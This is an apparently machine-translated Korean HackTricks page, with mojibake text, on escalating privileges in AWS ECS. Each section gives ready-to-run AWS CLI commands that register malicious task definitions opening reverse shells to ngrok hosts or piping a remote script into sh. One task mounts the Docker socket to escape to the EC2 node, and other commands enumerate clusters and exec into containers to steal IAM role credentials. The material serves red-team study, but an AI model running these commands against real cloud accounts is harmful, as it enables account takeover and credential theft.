# AWS - ECS ê¶Œí•œ ìƒìŠ¹

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ê¸°ë²•ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>

## ECS

ECSì— ëŒ€í•œ **ì¶”ê°€ ì •ë³´**ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ECSì—ì„œ `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask` ê¶Œí•œì„ ì•…ìš©í•˜ëŠ” ê³µê²©ìëŠ” **ì•…ì„± ì»¨í…Œì´ë„ˆ**ê°€ ë©”íƒ€ë°ì´í„° ìê²© ì¦ëª…ì„ ë„ìš©í•˜ê³  **ìƒˆë¡œìš´ ì‘ì—… ì •ì˜**ë¥¼ ìƒì„±í•˜ì—¬ **ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**ì ì¬ì  ì˜í–¥:** ë‹¤ë¥¸ ECS ì—­í• ë¡œì˜ ì§ì ‘ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

ì´ì „ ì˜ˆì œì™€ ë§ˆì°¬ê°€ì§€ë¡œ, ECSì—ì„œ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** ê¶Œí•œì„ ì•…ìš©í•˜ëŠ” ê³µê²©ìëŠ” ì•…ì„± ì»¨í…Œì´ë„ˆë¥¼ ê°€ì§„ ìƒˆë¡œìš´ ì‘ì—… ì •ì˜ë¥¼ **ìƒì„±**í•˜ê³  ë©”íƒ€ë°ì´í„° ìê²© ì¦ëª…ì„ ë„ìš©í•˜ì—¬ **ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì´ ê²½ìš°ì—ëŠ” ì•…ì„± ì‘ì—… ì •ì˜ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì»¨í…Œì´ë„ˆ ì¸ìŠ¤í„´ìŠ¤ê°€ í•„ìš”í•©ë‹ˆë‹¤.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**ì ì¬ì  ì˜í–¥:** ì–´ë–¤ ECS ì—­í• ì— ëŒ€í•œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

ì´ì „ ì˜ˆì œì™€ ë§ˆì°¬ê°€ì§€ë¡œ, ECSì—ì„œ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ë˜ëŠ” **`ecs:CreateService`** ê¶Œí•œì„ ì•…ìš©í•˜ëŠ” ê³µê²©ìëŠ” **ì•…ì„± ì»¨í…Œì´ë„ˆ**ë¥¼ ê°€ì§„ **ìƒˆë¡œìš´ ì‘ì—… ì •ì˜ë¥¼ ìƒì„±**í•˜ì—¬ ë©”íƒ€ë°ì´í„° ìê²© ì¦ëª…ì„ ë„ìš©í•˜ê³ , **ì ì–´ë„ 1ê°œì˜ ì‘ì—…ì´ ì‹¤í–‰ë˜ëŠ” ìƒˆë¡œìš´ ì„œë¹„ìŠ¤ë¥¼ ìƒì„±í•˜ì—¬ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**ì ì¬ì  ì˜í–¥:** ì–´ë–¤ ECS ì—­í• ì— ëŒ€í•œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

ì´ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ì „ê³¼ ë¹„ìŠ·í•˜ì§€ë§Œ **`iam:PassRole`** ê¶Œí•œì´ **ì—†ëŠ”** ê²½ìš°ì…ë‹ˆë‹¤.\
ì´ê²ƒì€ ì—¬ì „íˆ í¥ë¯¸ë¡œìš´ë°, ì„ì˜ì˜ ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´, ì—­í• ì´ ì—†ë”ë¼ë„ **íŠ¹ê¶Œ ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•˜ì—¬** ë…¸ë“œë¡œ **íƒˆì¶œ**í•˜ê³ , ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ **EC2 IAM ì—­í• ** ë° **ë‹¤ë¥¸ ECS ì»¨í…Œì´ë„ˆ ì—­í• **ì„ ë„ë‚œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì‹¬ì§€ì–´ [**ë…¸ë“œë¡œì˜ ê¶Œí•œ ìƒìŠ¹ ì„¹ì…˜**](aws-ecs-privesc.md#privesc-to-node)ì—ì„œ ë…¼ì˜ëœ ëŒ€ë¡œ, ì¹¨íˆ¬í•œ EC2 ì¸ìŠ¤í„´ìŠ¤ ë‚´ì—ì„œ ë‹¤ë¥¸ ì‘ì—…ì„ ì‹¤í–‰í•˜ë„ë¡ ê°•ì œí•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì´ ê³µê²©ì€ **ECS í´ëŸ¬ìŠ¤í„°ê°€ EC2** ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‚¬ìš©í•˜ê³  Fargateë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°ì—ë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤.
{% endhint %}
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

**`ecs:ExecuteCommand`, `ecs:DescribeTasks`** ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆ ë‚´ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê³  ê·¸ì— ì—°ê²°ëœ IAM ì—­í• ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`aws ecs execute-command`ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ describe ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤).

ê·¸ëŸ¬ë‚˜ ì´ë¥¼ ìœ„í•´ì„œëŠ” ì»¨í…Œì´ë„ˆ ì¸ìŠ¤í„´ìŠ¤ê°€ ê¸°ë³¸ì ìœ¼ë¡œ ì‹¤í–‰ë˜ëŠ” **ExecuteCommand ì—ì´ì „íŠ¸**ë¥¼ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ, ê³µê²©ìëŠ” ë‹¤ìŒì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì‹¤í–‰ ì¤‘ì¸ ëª¨ë“  ì»¨í…Œì´ë„ˆì—ì„œ **ëª…ë ¹ì„ ì‹¤í–‰**í•´ ë´…ë‹ˆë‹¤.
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
* ë§Œì•½ ê·¸ê°€ **`ecs:RunTask`**ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs run-task --enable-execute-command [...]`ë¡œ ì‘ì—…ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.
* ë§Œì•½ ê·¸ê°€ **`ecs:StartTask`**ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs start-task --enable-execute-command [...]`ë¡œ ì‘ì—…ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.
* ë§Œì•½ ê·¸ê°€ **`ecs:CreateService`**ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs create-service --enable-execute-command [...]`ë¡œ ì„œë¹„ìŠ¤ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
* ë§Œì•½ ê·¸ê°€ **`ecs:UpdateService`**ë¥¼ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs update-service --enable-execute-command [...]`ë¡œ ì„œë¹„ìŠ¤ë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤.

**ì´ëŸ¬í•œ ì˜µì…˜ì˜ ì˜ˆì‹œ**ëŠ” **ì´ì „ ECS ê¶Œí•œ ìƒìŠ¹ ì„¹ì…˜**ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì ì¬ì ì¸ ì˜í–¥:** ì»¨í…Œì´ë„ˆì— ì—°ê²°ëœ ë‹¤ë¥¸ ì—­í• ë¡œì˜ ê¶Œí•œ ìƒìŠ¹.

### `ssm:StartSession`

ì´ ê¶Œí•œì„ ì•…ìš©í•˜ì—¬ **ECSë¡œ ê¶Œí•œ ìƒìŠ¹**í•˜ëŠ” ë°©ë²•ì€ **ssm ê¶Œí•œ ìƒìŠ¹ í˜ì´ì§€**ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="aws-ssm-privesc.md" %}
[aws-ssm-privesc.md](aws-ssm-privesc.md)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

ì´ ê¶Œí•œì„ ì•…ìš©í•˜ì—¬ **ECSë¡œ ê¶Œí•œ ìƒìŠ¹**í•˜ëŠ” ë°©ë²•ì€ **ec2 ê¶Œí•œ ìƒìŠ¹ í˜ì´ì§€**ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="aws-ec2-privesc.md" %}
[aws-ec2-privesc.md](aws-ec2-privesc.md)
{% endcontent-ref %}

### `?ecs:RegisterContainerInstance`

TODO: ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ê¸°ê³„ì—ì„œ ì‘ì—…ì´ ì‹¤í–‰ë˜ë„ë¡ ë‹¤ë¥¸ AWS ê³„ì •ì—ì„œ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ë“±ë¡í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆì„ê¹Œìš”??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

{% hint style="info" %}
TODO: ì´ë¥¼ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”.
{% endhint %}

`ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets` ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ê¸°ì¡´ ECS ì„œë¹„ìŠ¤ì— ì•…ì„± ì‘ì—… ì„¸íŠ¸ë¥¼ ìƒì„±í•˜ê³  ì£¼ìš” ì‘ì—… ì„¸íŠ¸ë¥¼ ì—…ë°ì´íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” ì„œë¹„ìŠ¤ ë‚´ì—ì„œ **ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
bashCopy code# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**ì ì¬ì  ì˜í–¥**: í•´ë‹¹ ì„œë¹„ìŠ¤ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ê¸°ëŠ¥ì— ì˜í–¥ì„ ì£¼ê±°ë‚˜ ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
